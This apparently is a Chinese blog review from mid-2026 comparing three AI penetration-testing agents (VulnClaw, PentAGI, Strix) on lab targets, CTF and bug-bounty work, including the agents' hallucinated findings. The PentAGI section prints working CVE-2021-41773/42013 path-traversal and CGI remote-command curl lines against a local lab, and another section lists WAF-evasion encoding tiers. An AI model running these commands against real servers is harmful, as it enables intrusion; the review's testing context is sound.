先把本人的来路讲清楚，否则结论会被读得比它该有的分量重。笔者不是科班安全出来的——本科软件工程，副修数字动漫，正经网安的课一节没上过；高中时期对"黑客"这事有过一厢情愿的兴趣，把 Kali Linux、BurpSuite Pro 这些工具挨个下载安装玩过一遍，仅此而已，远到不了能独立做渗透交付的程度。这次愿意花整段时间折腾，动机其实简单得很：暑假空闲时间较多，加上 AI 在网安领域终于站到了能跑、能补丁的位置——笔者想试试"用 AI 辅助 SRC 漏洞挖掘变现"这件事到底可不可行。
跑了不到两周下来，把 VulnClaw、PentAGI、Strix 这三套 AI 安全 Agent 摆在一起对比，体感差别大到像三件不同物种。本文不是软文，也不是 README 翻译——所有结论尽量落到 GitHub 源码和笔者的实测数据上。但有三件事得提前说白：
**\*\*第一，本文描述的"实测"范围不算大\*\***——
- VulnClaw：先在网络上跑了几轮简单的 SRC 试炼，因为代理/网络问题绝大多数动作还得笔者手动补作业；后来升级到最新版 *\`0.3.3\`* 后，跑通了一次**\*\*对 vulnhub 靶场\*\***的受限渗透测试；- PentAGI：Flow 1 一次 vulnhub 渗透（CVE-2021-41773），Flow 2 一次非常简单的 Git 泄露 CTF；- Strix：按补天平台规则对多个站点跑了完整的 SRC 漏洞挖掘流程——**\*\*但完整的那一整套八阶段 SOP、定级校准表、Phase 7 自优化、报告模板，是笔者一次又一次返工迭代出来的，不是 Strix 原生交付\*\***。
这一点很重要：三件工具其实都自带知识库/Skill 体系（VulnClaw 有 *\`secknowledge-skill\`* 等二十多个 Skill 知识库，PentAGI 有 prompts-optimization 的提示模板变量）。Strix 让人感觉"开箱好用"，不是因为它的 Skill 库更深，而是笔者愿意把自己试错的过程一条条沉淀到 SOP 文档里。所以下文凡是出现"Strix 闭环如此完整"的描述，请把它当作"**\*\*笔者 + Strix 一起迭代出的闭环\*\***"，不是 Strix 单杀的能力。
**\*\*第二，整个暑假验证流程的 Token 总消耗——将近一百元人民币。\*\***
文中逐条列出的 Flow 账单（PentAGI $4.57 / Strix $2.04）仅代表各自最后一次成功跑完的 scan 的直接 LLM 成本。笔者为把三套工具配通、跑对、把 SOP 迭代出来所用的**\*\*全部调试 Flow、失败 Flow、重复扫描和网络重试\*\***加在一起，API 额度（主要是 DeepSeek + OpenRouter）支出了接近百元。这笔账写在开头是因为"试用 AI 挖 SRC"最容易被忽略的成本不是工具安装，而是 LLM token 的累计消耗——当你觉得自己在等 agent 反复空转时，每一轮都在烧 token。
**\*\*第三，三款工具和本文都是 2026 年 7 月中旬的快照。\*\*** 截止 2026-07-19 GitHub 数据显示三个项目都在快速迭代：VulnClaw 创建仅 3 个月已有 2.1k star，发稿前一天仍在推代码；Strix 刚刚发布 v1.1.0（2026-07-14），新增 dependency CVE 扫描等能力；PentAGI 的 commit 活跃度同样不减。本文的观察——包括 Evidence Gate 的精度、PentAGI 的 Summarizer 雪崩、Strix 工具集偏薄——都只针对 **\*\*7 月 18 日之前\*\*** 的代码版本有效，下一轮大版本很可能改变部分结论。
三种体感先用一句话点明，后面再展开。配合 GitHub 截至 2026-07-19 的实时指标摆出来对照，你能更直观看到三者"成熟度"的刻度差：
| 工具 | GitHub Star | 首次创建 | 最近 commit | 笔者手感 ||---|---|---|---|---|| VulnClaw | **\*\*2,127\*\*** | 2026-04-18 | 2026-07-18 | 个人热情拉满的初期项目 || PentAGI | **\*\*20,935\*\*** | 2025-01-06 | 2026-07-18 | 工业级 AI 渗透代表作 || Strix | **\*\*42,556\*\*** | 2025-08-05 | 2026-07-18 | Agentic Security 社区共识 |
1. **\*\*VulnClaw\*\***：B 站 UP 主"网络小白_Uncle城"的初期作品，问题想得对、Evidence Gate 这套"以真实事实收尾"的工程很亮眼，但工具调用链整体仍处开发阶段——v0.3.3 那次靶场实测里，"已确认 Critical RCE"两条其实只是框架指纹识别（见 2.4 节）。2. **\*\*PentAGI\*\***：架构最成熟的成品，13-Agent 编队 + Docker-in-Docker Kali 沙箱 + Langfuse 全链路可观测，姿态最像"产品"；但代价是配置极其麻烦、容器栈吃得资源巨大、反复调工具和重复跑命令、API 消耗惊人、单次任务最慢。3. **\*\*Strix\*\***：是笔者三件里唯一陪着补天交付流程迭代到能"开箱交付"的那一件，单容器配置最简单、DeepSeek 把单轮成本压在 $2 量级；唯一短板是内置工具集相对单薄，多数能力靠 Skill 体系让 LLM 自桥接。
## 一、为什么是这三件套
先上一张基本盘对照表，把三者的"户口"摆清楚：
| 工具 | 仓库 | 作者 / 出品 | 实测版本 | 部署形态 | 调度模型 | 一句话定位 ||---|---|---|---|---|---|---|| VulnClaw 🦞 | \[Unclecheng-li/VulnClaw](https://github.com/Unclecheng-li/VulnClaw) | B 站"网络小白_Uncle城" | 0.3.3（README 已标 v0.4.1） | 单 CLI / REPL / TUI | OpenAI 兼容（实测 DeepSeek） | CLI 单 Agent，CTF/SRC 兵器 || PentAGI | \[vxcontrol/pentagi](https://github.com/vxcontrol/pentagi) | vxcontrol | 2.1.0-879e87c | 4 组 compose / ≈20 容器 / 3 网络 | 13 Agent + OpenRouter 多厂商路由 | 多 Agent + Docker-in-Docker Kali 沙箱 || Strix | \[usestrix/strix](https://github.com/usestrix/strix) | Ahmed Allam | 1.0.4 → 1.1.0 | 单容器 *\`strix-sandbox:1.0.0\`* + CLI | 多 Agent + LiteLLM | 多 Agent + Skill 体系 + 报告闭环 |
选取理由其实很简单：三件恰好覆盖"CLI 单 Agent / 重型多 Agent 沙箱 / 轻型多 Agent + 报告闭环"这一档 Agentic Security 形态谱系，差异足够大，便于读者按自己要的形态选择。如果三件定位高度重叠，横评就变成了广告；而这三件几乎是当下 AI 安全工具的三个层级代表，正好把"同代但是不同工程取向"摊开在一张桌上看。
## 二、VulnClaw 🦞：网络小白_Uncle城 的初期答卷
!\[VulnClaw - AI Agent + MCP 工具链 + 渗透 Skill 编排的开源安全 Agent](https://assets.soloeternity.me/images/posts/ai-pentest-toolkit/VulnClaw.webp)
### 2.1 来源与定位
VulnClaw 是 B 站 UP 主"网络小白_Uncle城"（*\`pyproject.toml\`* 写的是 *\`UncleC <iamloli@foxmail.com>\`*）的开源项目，MIT 协议，PyPI 包名 *\`vulnclaw\`*，要求 Python 3.10+。作者在 README 里给它打的标语是"一句话把靶点说人话，剩下的交给 AI"，定位是授权渗透测试、CTF、安全教学和红蓝对抗演练的 CLI 自动化工具——SOC 沙箱心态直接写进了系统 prompt，授权范围内一律当作靶场资产处理。
公开仓库侧指标能帮你快速把握"初期项目"的分量——截至 2026-07-19，GitHub 实时数据为：
| 指标 | 数值 ||---|---|| GitHub 仓库 | \[Unclecheng-li/VulnClaw](https://github.com/Unclecheng-li/VulnClaw) || Star | **\*\*2,127\*\*** || Fork | 288 || 主语言 | Python || 仓库描述 | 基于 AI Agent + MCP 工具链 + 渗透 Skill 编排，配合大语言模型，自然语言输入 → 自动完成「信息收集 → 漏洞发现 → 漏洞利用 → 报告生成」全流程 || 首次创建 | 2026-04-18 || 最近 commit | 2026-07-18（本文发稿前一天仍在推代码） || Open Issues | 9 |
从 commit 活跃度看，这个项目在本文发稿前一天还在推代码，是典型的"个人热情拉满的初期项目"——作者的工程手感是真实的，但工业级强度没补上来。
笔者拉到本地的源码对应版本最初是 *\`0.3.2\`*，升级到 *\`0.3.3\`* 跑完了一次靶场渗透测试后（详见 2.4），README 此时已经挂出 *\`v0.4.1\`* 的 changelog，提及"并行 Intent 探索 / 记忆引擎 / 侦察工具链 / MCP streamable-HTTP"。这种"安装能拿到的稳定锚点比 README 标榜的版本落后小一档"的版本错位，本身就是初期项目迭代快、发版对不齐的写照——*\`pyproject.toml\`* 的发版点和文档里宣传的能力是错开的。
### 2.2 Evidence Gate：唯一让笔者眼前一亮的工程
VulnClaw 看似一件普通 CLI，但 *\`vulnclaw/solver.py\`* 里有一处设计是真值得被同行抄走的——**\*\*Evidence Gate（证据闸门）\*\***。它把"固定若干轮跑完"的循环替换成了基于 **\*\*Fact / Intent 黑板图\*\***的状态空间搜索：
- *\`Fact\`* 只能由真实工具输出确认产生（一次 HTTP 响应、一次 *\`python_execute\`* 输出、一次 nmap 结果）；- *\`Intent\`* 是声明后的探索方向，尚未落地，每个 Intent 只许声明一次——一旦被 reason 选去做，结果或者写入新 Fact、或者标记 *\`abandoned\`*，不会反复提出；- *\`anti_loop.py\`* 用 Jaccard 相似度 0.65 阈值卡近似重复 Intent；*\`solver.py\`* 注释里还有一句"严禁重复提出"直接塞进 reason 的 prompt；- 收尾双闸门：当 Explore 声称拿到 flag，这条 flag 必须**\*\*逐字符\*\***出现在被 monkey-patch 的 *\`_execute_mcp_tool\`* 抓回的真实响应里，否则判作幻觉直接丢弃；当 Reason 返回 *\`complete=true\`*，必须满足四种条件（字面 true + 携带 reason + 引用真实 Fact ID + 不含 *\`_NEGATION_MARKERS\`* 列里的否定词），否则写回一条 *\`\[拒绝完成] <原因>\`* 并继续探索。
这套设计的初衷在 *\`solver.py\`* 注释里写得很直白："弱模型会陷入空转——一再承诺去测注入却从不真的发包"。用 Fact/Intent 把"已经确认过的事"和"声称要去做的事"严格切开，这是笔者在另两件工具里都没看到的对幻觉的工程化对抗。
*\`reflexion.py\`* 还附带一套 **\*\*L0-L4 渐进 payload 升级\*\***：L0 直接发原始 payload → L1 URL 编码/大小写混合/空格变体 → L2 双重 URL 编码 / *\`/\*\*/\`* 注释 / HTML 实体 → L3 Unicode 转义 / hex / *\`con||cat\`* 关键字拼接 → L4 多层编码混淆 + *\`HANDLER\`* 替换 *\`SELECT\`* / 时间盲 / OOB 换面。这套阶梯在 Web CTF 和 SRC 弱 WAF 场景非常实用。
*\>* **\*\*注意\*\****：\`solver.py\` 注释里多次出现"参考 Cairn reason.md""Cairn 改进 #5"的字样——作者本人在向上游一个叫 Cairn 的项目学。早期项目"在争取长得像成熟品"的诚实信号，写在了源码注释里。*
### 2.3 工具链与 Skill：尚处开发阶段的真实证据
VulnClaw 走 MCP 体系，4 个服务里：
| MCP 服务 | 模式 | 出厂状态 ||---|---|---|| *\`fetch\`* | 本地 httpx | 开箱即用 || *\`memory\`* | 本地 JSON | 开箱即用 || *\`chrome-devtools-mcp\`* | stdio（*\`npx chrome-devtools-mcp@latest\`*） | 需自行部署 || *\`burp-mcp\`* | SSE（*\`127.0.0.1:9876\`*） | 需自行部署，文档明确把它定位为 Yakit 缺 MCP 的替代 |
文档自己把 burp-mcp 写成"Yakit 临时缺 MCP（Issue #2703），所以选 Burp"——这是作者对工具链成熟度的自承认：选型不是按"谁最好"，而是按"谁有 MCP 接口"。
真正让笔者觉得"初期项目最直白证据"的是 *\`vulnclaw/builtin_tools.py\`* 这一段：
*\`\`\`python# python_execute — high-risk experimental capability,# not a hardened sandbox. 使用须自负风险。\`\`\`*
作者自己把 *\`python_execute\`* 标成"实验性、非硬化沙箱"，但它却是攻击链的主执行体——大量 PoC 验证、解密链、payload 构造全靠它跑。这种"明知是实验性但还得当主力用"的状态，正是初期项目还没把工程化做完的标志。
类似的特征还有：
- *\`nmap_scan\`* 在 *\`builtin_tools.py\`* 里专门写了一段"IANA 保留地址段直接跳过并写 warning"的代码；- *\`brute_force_login\`* 还要专门识别 DVWA 那种 *\`isset($_POST\['Submit'])\`* 的"按钮没按住就静默跳判"的靶场特化逻辑；- Skill 文档/reference 造得飞快——7 个核心 Skill + 14 个专项 Skill，共 180 篇 reference；但工具反而最慢。
Skill 数量造得最快、工具反而最慢——这种节奏感本身就是初期项目典型的"先有蓝图、后有口径"。
### 2.4 三赛道实测印象
*\`\`\`textCTF   → ctf_mode.py 的 flag 状态机 + Evidence Gate 是天然的"幻觉过滤器"SRC   → 网络原因前三轮基本退化成手动作业；后续未再做完整 SRC 流程渗透   → CLI 兵器风格最快上手，但 MCP 部署链在 Windows 上反复崩\`\`\`*
**\*\*CTF\*\*** 是笔者在 2.4 没法亲自给出大段实测样本的赛道——这次暑假期间笔者只把 VulnClaw 真正跑通的，是一次本地的 vulnhub 靶场受限渗透（详下）。但仅就源码与设计而言，原生 *\`ctf_mode.py\`* 的 flag 状态机加 Evidence Gate 在 CTF 场景下确实是天然的"幻觉过滤器"——题答格式已知，逐字符对比是最干净的真假判据。这条赛道应该是 VulnClaw 后续最值得期待的切入点。
**\*\*SRC\*\*** 这条笔者也只是开了个头：最初尝试用 VulnClaw 跑几轮简单的 SRC 漏洞挖掘，但卡在代理/网络层面——很多目标国外资产到不了、*\`space_search\`* 那套国外引擎（Shodan/ZoomEye/0.zone）从国内直连结果质量波动大，最终绝大多数实际动作还是笔者手动补作业完成的。这部分严格说不算"AI 完整跑完"，所以下方不再把内置的 *\`space_search / subdomain_enum / js_recon / unauth_test / dir_enum\`* 当成"笔者实测好用"来吹——它们从代码上看是设计了，但本机这一次没能完整跑通一套顺手的 SRC 链路。代码层面这些工具实现的单点细节也确实还在打磨：例如 *\`space_search\`* 一家引擎配一段 *\`try/except\`* 兜底，崩了只能重试；*\`js_recon\`* 的"PascalCase 推断隐藏接口"路径容易被 LLM 拼出无意义的 endpoint。这些工具准备好与准备好之间还差一轮收尾。
*\> 注：2.4 SRC 段与本文最早版本不同——最早版本夸了 \`js_recon\` 命中率高，是按下文 Strix 章节那条"自动跑出接口"的经验外推过去的，并不是笔者在 VulnClaw 这边亲测得到的结论。事实登记：VulnClaw 在笔者这次暑假实测范围下，***\*\*没能独立跑完一条 SRC 流程\*\****。*
**\*\*渗透测试 / 靶场测试\*\***——这条是 VulnClaw 在笔者这次实测里真正完整跑过的赛道。升级到 v0.3.3 后，对 *\`http://127.0.0.1:8888/\`*（vulhub ThinkPHP 5.x 镜像）跑了一次受限渗透：约束里只允许 *\`recon\`* + *\`scan\`* 两个动作、明确禁掉 *\`post_exploitation\`*。结果出乎笔者预料地"模式有意义但也暴露问题"——下面这张表是从生成报告里逐字摘出来的：
| 项 | 内容 ||---|---|| 工具版本 | VulnClaw v0.3.3（README 已标 v0.4.1，安装与文档存在版本错位） || 测试用时 | 2026-07-19 18:13:10 → 18:19:08（报告生成），约 6 分钟 || 任务约束 | 仅主机 127.0.0.1；仅动作 *\`recon\`*、*\`scan\`*；禁 *\`post_exploitation\`* || 已验证漏洞条数 | 2（两条均标 Critical、生命周期 *\`verified\`*、证据等级 *\`L4\`*） || 约束阻断次数 | 3 次（agent 反复尝试 *\`scan\`* 触发约束拦截） || 测试时间 | 2026-07-19（GitHub star 已达 2,127，作者前一天仍在推代码） |
但这两条"已确认 Critical RCE"本身就有问题——逐条贴一下：
- 漏洞 1：标题写的"ThinkPHP V5.0 正在运行。现在直接测试已知的 ThinkPHP 5.x RCE 漏洞（CNVD-2018-24942）"——这是**\*\*框架指纹识别\*\***，不是已确认的 RCE；漏洞类型却写"远程代码执行"。- 漏洞 2：标题是"ThinkPHP V5.0 运行中，robots.txt 为空无帮助。*\`?s=captcha\`* 返回了 ThinkPHP 错误页面（404），说明路由系统正常。现在尝试获取更精确的版本信息和探测已知 RCE 端点"——这甚至不是漏洞，是一条 agent 探路记录自言自语，却被标成了 Critical + 已验证。
*\> 报告原文："***\*\*原则\*\****: 未经验证的漏洞 = 误报 = 不写入报告"——可这两条"已验证"的条目，正好违反这条原则。*
也就是说，即便 VulnClaw 内置了 Evidence Gate 这道闸门，在自承的 *\`verified\`* / *\`L4\`* / *\`Critical\`* 字段上，agent 依然能把"找到了 ThinkPHP"和"找到了 ThinkPHP 5.x RCE 可利用"混为一谈。**\*\*这是笔者在 VulnClaw 上学到的最有用的一课\*\***——对抗幻觉的设计再用心，也没法在"在 fact 等级放上'说下一步要做什么'"vs"在 fact 等级放上'已实现了什么'"这二者的区分上保证不糊。
值得点一笔的正面现象是约束系统：agent 三次想要继续推进动作（js_recon / dir_enum / python_execute 都被推断成 *\`scan\`* 动作），全部撞到了笔者设的约束护栏被拦下来——这种约束的执行力比同类工具里要硬。这一条确实值得肯定。
### 2.5 笔者感想想明
设计层面是真的对：Fact/Intent 黑板图和 Evidence Gate 这套"以真实事实收尾"的工程，值得被同类项目抄走——尤其在当下 LLM 越来越强但幻觉率仍不可忽视的阶段，强行让"声称"和"证明"分离这件事，比堆参数和调 prompt 都靠谱。
**\*\*但仅设计层面\*\***。2.4 那场 v0.3.3 靶场实测就给笔者敲了一记闷棍——Evidence Gate 卡死"声称的 flag 必须逐字符出现在真实响应里"这件事确实做到了，可 agent 还是把"已经识别出 ThinkPHP V5.0"这一条 Fact，写成"已确认 Critical RCE"——而且报告头明确自承"未经验证的漏洞 = 误报 = 不写入报告"，然后写进了两条根本不是漏洞的"已确认 RCE"。设计预防的是"flag 幻觉"，没预防"漏洞类型归类"与"已识别 vs 已利用"之间的混淆。
整体处于开发期：MCP 部署门槛高、*\`python_execute\`* 自承实验性、版本号不齐、特化代码（DVWA isset、内网跳段）过多、约束护栏对 *\`scan\`* 动作的语义边界识别还偏向保守（js_recon 都被归成 scan）——这次跑下来笔者甚至没法独立让 VulnClaw 走完一条 SRC 流程，更别交付补天报告。
*\>* **\*\*一句话\*\****：值得长期关注的成长品。Evidence Gate 是它最早立起来的护城河，但实测里这道闸门也没挡住 agent 把"识别框架"写成"已验证 RCE"——工具链成熟度是它的当下天花板。*
## 三、PentAGI：架构最成熟的"重器"，但代价也很重
!\[PentAGI - vxcontrol 出品的 13-Agent 自主渗透测试平台](https://assets.soloeternity.me/images/posts/ai-pentest-toolkit/PentAGI.webp)
### 3.1 来源与定位
PentAGI 是 vxcontrol 出品的多 Agent 自主渗透测试平台，\[github.com/vxcontrol/pentagi](https://github.com/vxcontrol/pentagi)，官网 \[pentagi.com](https://pentagi.com/)，笔者本地构建版本 *\`2.1.0-879e87c\`*。它不是"一个 LLM 加聊天 UI"那档东西，而是从头到尾的完整栈：Coordinator 拆目标 → 派给十几个专职 Agent → 每个 Flow 起一个全新 Kali 容器跑 nmap/sqlmap/MSF 等 → 通过 Web 搜索补 CVE/exploit 资讯 → 汇总 Markdown 审计报告。两模式：**\*\*Automation\*\***（完全自主，适合隔离目标）与 **\*\*Assistant\*\***（人工步进、可委派子 Agent）。
从仓库指标上看 PentAGI 与 VulnClaw 的差距就是一条量级河——截至 2026-07-19：
| 指标 | 数值 ||---|---|| GitHub 仓库 | \[vxcontrol/pentagi](https://github.com/vxcontrol/pentagi) || Star | **\*\*20,935\*\*** || Fork | 2,758 || 主语言 | Go（后端） + TypeScript（前端） || 仓库描述 | Fully autonomous AI Agents system capable of performing complex penetration testing tasks（README 自称 "Penetration testing Artificial General Intelligence"） || 首次创建 | 2025-01-06 || 最近 commit | 2026-07-18 || Open Issues | 45 |
"AI 通用渗透测试 Artificial General Intelligence"的自称能被 2 万 star 承接，说明它确实在 Agentic Security 这一档里是工业级代表作品。但下表也看得清楚，这份工业级标签是要按资源账单兑付的。
源码层面看"成熟度"最直观的证据是四个 compose 文件 + 三个隔离网络、约 20 个容器：
*\`\`\`textdocker-compose.yml                  核心: pentagi / pgvector / pgexporter / scraperdocker-compose-graphiti.yml          知识图谱: neo4j / graphitidocker-compose-langfuse.yml          LLM 可观测: langfuse-web / langfuse-worker / clickhouse / postgres / redis / miniodocker-compose-observability.yml    监控: grafana / otel / victoriametrics / loki / jaeger / cadvisor / node-exporter\`\`\`*
而每条"Flow"又会启一个全新的 *\`vxcontrol/kali-linux:latest\`* 容器（约 20.5GB），主容器挂 docker.sock 才能做这件事——这是 PentAGI 与另两件工具最显著的架构差异，也是它"成熟但重"的源头。
### 3.2 13-Agent 编队 + OpenRouter 多厂商路由
*\`installer-latest/openrouter.provider.yml\`* 把每个 Agent 类型分别绑到了独立 LLM，这段配置本身就是 PentAGI 成熟度的最佳证据。实测盘上的真实部署是：
| Agent | 模型 | 角色 ||---|---|---|| simple / simple_json | *\`qwen/qwen3.6-flash\`* | 高频摘要 + 轻量结构化输出 || primary_agent | *\`z-ai/glm-5.2\`* | 顶层任务拆解与协调 || assistant | *\`z-ai/glm-5.2\`* | Assistant 模式处理 || generator | *\`z-ai/glm-5.2\`* | 子任务计划与报告生成 || refiner | *\`z-ai/glm-5.2\`* | 报告修订与定级 || adviser | *\`z-ai/glm-5.2\`*（reasoning high） | 深度评审与批评 || reflector | *\`qwen/qwen3.6-flash\`* | 自反思与状态摘要 || searcher | *\`z-ai/glm-5.2\`*（reasoning low） | 网络搜索结果分析 || enricher | *\`qwen/qwen3.6-flash\`* | 上下文富化 || coder | *\`qwen/qwen3-coder-next\`* | 代码/载荷/恢复脚本生成 || installer | *\`z-ai/glm-5.2\`* | 沙箱内工具安装与文件操作 || pentester | *\`moonshotai/kimi-k2-0905\`* | 实际攻击驱动（Flow 1 选 Kimi 因为它对路径穿越+RCE 的推理表现最好） |
但这里有个**\*\*最隐蔽的 footgun\*\***：UI 上选 Provider 时，只有 *\`custom\`*（OpenRouter 多厂商路由）才会真正启用这份 13-Agent 模型映射；如果选了 *\`deepseek\`* 或 *\`openai\`* 直连，整个分工会被一脚踢没——所有 Agent 全部退化到那个单模型。Flow 2 我们会亲眼看到这个坑被踩中，而 PentAGI 在 UI 上没有任何警告。
### 3.3 Flow 1：CVE-2021-41773 自主打通
目标是 *\`http://host.docker.internal:8080\`*（vulhub Apache 2.4.49），Automation 模式。先看真实账单：
*\`\`\`text墙钟时间     ~3h09minLLM 调用      227 次工具调用      306 次（286 成功 / 20 失败，6.5% 失败率）输入 token    4,552,895输出 token    856,379真实 OpenRouter 账单    $4.57最终报告      /home/report.md，684 行 / 21,473 字节漏洞发现      9 个（其中 2 个 Critical）\`\`\`*
自主打通的完整链路是：
*\`\``bash# 版本识别 + CVE 检索curl -I http://host.docker.internal:8080                      # Apache 2.4.49# Sploitus / DuckDuckGo 搜索 CVE-2021-41773 / 42013*
*\# CVE-2021-41773 文件读取curl --path-as-is* "http://host.docker.internal:8080/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"*curl --path-as-is* "http://host.docker.internal:8080/icons/.%2e/.%2e/.%2e/.%2e/etc/httpd/conf/httpd.conf"
*\# CVE-2021-42013 双重编码变异curl --path-as-is* "http://host.docker.internal:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
*\# CGI 远程代码执行curl -X POST --path-as-is \  "http://host.docker.internal:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \  -d* "echo;id"*\# → uid=1(daemon) gid=1(daemon) groups=1(daemon)\`\``*
有两件事让笔者对 PentAGI 的成熟度印象深刻：
1. 那个 *\`--path-as-is\`* 是攸关细节——不加它，curl 在客户端就把 *\`.%2e\`* 规约成 *\`.\`*，整个 CVE 复现不出来；Agent 是自己摸出来的。2. Agent 在报告里**\*\*主动纠正\*\***："执行上下文是低权限 *\`daemon\`*，不是 root，不构成全自动 RCE"。这种"诚实承认不到 root"的克制，是 PentAGI 那种 agent 编排成熟期才会有的 trait。
### 3.4 笔者对 PentAGI 的三条抱怨（用实测数据撑）
PentAGI 工程上确实成熟，但同样这段实测也把它"成熟代价"这一面暴露无遗。笔者列三条最直接的：
**\*\*抱怨 1：配置麻烦\*\***。同样这台机器上，笔者为把 Kali worker 容器接到内网目标，前后折腾 *\`DOCKER_NETWORK=pentagi-network\`* + *`docker network connect pentagi-network <target>`*；为修镜像构建里的代理 7890，写了个 *\`start-installer.cmd\`* wrapper 把 *\`PROXY_URL=http://host.docker.internal:7890\`*（vs *\`127.0.0.1:7890\`*，因为容器要从 Windows 看到 Host）灌进去；为躲开 Windows/Hyper-V 占用的 3977-4076 端口段，把 Langfuse 改到 4100。一晚上 netsh、PowerShell、*\`docker network inspect\`* 来回跑——架构越成熟、接线越累，这件事 PentAGI 实锤。
**\*\*抱怨 2：资源占用极大\*\***。\~20 个容器同时跑，Docker 给走 \~7.6GB RAM。笔者这台 i7-14650HX / 16GB / RTX 4060 Laptop 8GB VRAM 的机器完全跑不动本地大模型——要达到架构设想的效果（13 Agent、长上下文），推荐上下文窗口要 ~110K，本地这点 VRAM 根本撑不住。结论是必须走云推理。一台普通开发机根本带不动 PentAGI"完整形态"。
**\*\*抱怨 3：重复调工具 + API 烧 + 耗时长\*\***。这是笔者觉得最肉疼的一条。Flow 1 里：
*\`\`\`text重复 curl 调用         ~1,200+ 次（同一组 endpoint 反复请求）重复 nmap              30 次（实际只需 2 次的不同参数组合够了）重复 whatweb           33 次/icons/ 目录列表 HTML  在 agent 上下文里被引用 1,610 次Summarizer 占 LLM 调用 57%（129/227）\`\`\`*
PentAGI 没有"调用一次工具结果记下来"的强约束，所有 Agent 看到上下文里那个超大的 *\`/icons/\`* HTML 列表就开始反复围绕它讨论；上下文一爆，Summarizer 一压，原上下文丢失，Agent 又开始重新对同一组 endpoint 发包探索——这就是笔者戏称的"Summarizer 雪崩"。Flow 2 这个比例升到了 **\*\*84.5%（447/529）\*\***。然后**\*\*状态字段三套话\*\***：Flow 一直停在 *\`waiting\`*、Task 标 *\`finished\`*、子任务被标 *\`failed\`* 的证据里却带着成功的读文件 + RCE。笔者从这次实测得了一条铁律：
*\>* **\*\*永远别只信 Subtask 状态，要交叉核对 Task 结果 + Tool Call I/O + Terminal Log + 最终 report 文件。\*\***
**\*\*抱怨 4（隐藏的厂商陷阱）：OpenRouter TOS 403。\*\*** 这是笔者在两场 Flow 之外另跑的一组对照实验里撞出来的发现。出发时笔者本来按"用最强的模型"挑了 GPT-5、Claude Sonnet 4.5、Gemini 2.5 Pro 三家顶配喂给 PentAGI——结果一开 Flow 几乎所有请求都吃 *\`provider_name: null\`* + 403。笔者一度以为是网络/Key 问题：手动在 OpenRouter 后台用同样的 payload 试，发现对这几家做的"red-team 工作负载"全部被拒。后续用 Codex 自带的浏览器登 *\`openrouter.ai/settings/privacy\`* 翻了一圈，真正阻塞的不是 Key 权限、不是区域设置、也不是 Guardrail——而是这三家厂商在 OpenRouter 协议下**\*\*对账户层面的"对抗性安全"工作负载做了 TOS 级拒绝\*\***，不是请求送到他们服务器才拒，是 OpenRouter 路由层就拦下来了。最终的稳定集就剩下 Qwen / GLM / Grok / Kimi / DeepSeek 这几家——这就是上文那 13-Agent 模型映射为什么没一个用"大同三家"的真实原因。这件事意义不大但很重要：**\*\*做 AI 安全工具选型时，不能拿着"哪个模型最强"的横向 benchmark 直接套，要先看它对 red-team payload 是否过得了 TOS\*\***。
### 3.5 Flow 2：Git 泄露 CTF 解旗（成熟架构的另一面）
Flow 2 是一道 Git 泄露 CTF——题面提示"小李经过几次迭代就把整个文件夹直接放线上"，flag 格式 *\`n1book{...}\`*。run 到 **\*\*T+86 分钟\*\***，Agent 在 *\`git grep\`* 全历史里找到 flag：
*\`\`\`text文件     /work/recovered_repo/index.html，line 85commit   213b7e386e9b0b406d91fae58bf8be11a58c3f88作者     已脱敏提交信息  字面量就是 "flag"flag     n1book{git_looks_s0_easyfun}\`\`\`*
但成功的另一面也是灾难——这一 Flow 链了 529 次 LLM 调用、**\*\*90 次 502 Bad Gateway\*\***（误用 *\`host.docker.internal:80\`* 找容器内目标）、34 次 NXDOMAIN、66 次超时；同时 Provider 被错选成 *\`deepseek\`* 直连，把整个 13-Agent 分工打没根，所有 Agent 退化到 *\`deepseek-v4-pro\`* / *\`deepseek-v4-flash\`*——Summarizer 用 deepseek-v4-flash 而不是便宜的 qwen3.6-flash，成本曲线被放大；最讽刺的是拿到 flag 之后 Flow 仍停在 *\`waiting\`*，没自己宣布完成。
笔者的结论是：PentAGI 已经具备自主解 CTF 的能力（86 分钟解了一个 Git 泄露题，按题面提示精确锁到那条 "flag" commit），但每解一题的代价（LLM 调用次数 / 工具调用次数 / 时间）显著高于另两件。
### 3.6 笔者感想想明
笔者对 PentAGI 的总评：**\*\*架构最成熟、可观测性最强，Langfuse 让你能看见 Agent 为什么那么想、为什么要回头改某个载荷、哪一次工具调用的响应把它带偏了\*\***——这种"复盘到的不是聊天日志而是整张 span 树"的体感，是另两件都没有的。但代价同样很显眼：配置重、容器栈吃资源、对同一件事反复调工具、API 单价乘以冗余次数后烧得肉疼、单次任务最慢。
笔者建议：**\*\*把 PentAGI 定位成"研究靶场 / 数字取证风格的复盘工具"，而不是日常 SRC 批量扫描\*\***。除非你有专职运维 + 一台 32GB 以上 RAM 的工作站 + 一个 OpenRouter 高配账户（注：OpenAI/Anthropic/Google 三家对 red-team 工作负载在 OpenRouter 上过不去 TOS 403，能稳定跑的只剩 Qwen / GLM / Grok / Kimi / DeepSeek 这几家的），别把它当随手即用的工具。
*\>* **\*\*一句话\*\****：架构成熟度爆表，但成熟是有成本的——你愿意为它养一台工作站吗？*
## 四、Strix：被笔者追着迭代到能交付的那一件
!\[Strix - usestrix 出品的开源 AI 渗透测试工具](https://assets.soloeternity.me/images/posts/ai-pentest-toolkit/Strix.webp)
### 4.1 来源与定位
Strix 来自 \[github.com/usestrix/strix](https://github.com/usestrix/strix)，作者 Ahmed Allam，Apache 2.0 协议，PyPI 包名 *\`strix-agent\`*。笔者本机从 *\`1.0.4\`* 升到 *\`1.1.0\`*。它的官方标语是"Autonomous Security for the AI Era"，但更贴切的描述是——**\*\*三件里唯一不是为'研究玩具'而是为'甲方报告交付'准备的\*\***。
仓库侧指标是三件里最强的——截至 2026-07-19：
| 指标 | 数值 ||---|---|| GitHub 仓库 | \[usestrix/strix](https://github.com/usestrix/strix) || Star | **\*\*42,556\*\***（约是 PentAGI 的 2 倍、VulnClaw 的 20 倍） || Fork | 4,388 || 主语言 | Python（92.8%） || 仓库描述 | Open-source AI penetration testing tool to find and fix your app's vulnerabilities || 首次创建 | 2025-08-05 || 最新 release | v1.1.0（2026-07-14，共 17 个 release） || Open Issues | 201 || 官方口号 | Strix 自称 "autonomously found over 49,000 vulnerabilities"，其中含一例 "600+ verified vulnerabilities including assigned CVEs, replicating a $50k pentest service for free" |
